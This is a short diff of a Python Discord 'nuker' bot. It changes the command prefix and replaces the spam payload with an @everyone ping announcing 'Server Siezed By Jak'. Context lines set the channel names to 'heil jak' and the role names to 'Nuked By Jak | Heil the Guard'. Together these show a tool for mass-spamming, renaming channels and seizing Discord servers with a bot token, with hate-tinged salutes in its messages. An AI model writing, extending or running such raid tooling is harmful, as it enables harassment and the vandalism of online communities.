@@ -6,13 +6,17 @@ import requests as rq_
 from colorama import Fore
 from discord.ext import commands
 
-prefix = 'j>'
+prefix = '>'
 intents = discord.Intents.all()
 TOKEN = input("Token:")
 headers = {'Authorization': f'Bot {TOKEN}'}
 chNames = ['heil jak', 'heil jak', 'heil jak', 'heil jak']
 rNames = ['Nuked By Jak | Heil the Guard', 'Nuked By Jak | Heil the Guard']
-SPAM = "@everyone https://media.discordapp.net/attachments/1109864692106661958/1111222979322458193/caption.gif discord.gg/austriahungary"
+SPAM = """
+||@everyone||
+```Server Siezed By Jak | The Almighty Elitest```
+https://media.discordapp.net/attachments/1116771135636373596/1121139964294479962/Untitled61_20230621140947.png
+"""
 rq = rq_.Session()
 
 Sachs = commands.Bot(command_prefix=prefix, intents=intents, case_insensitive=True)
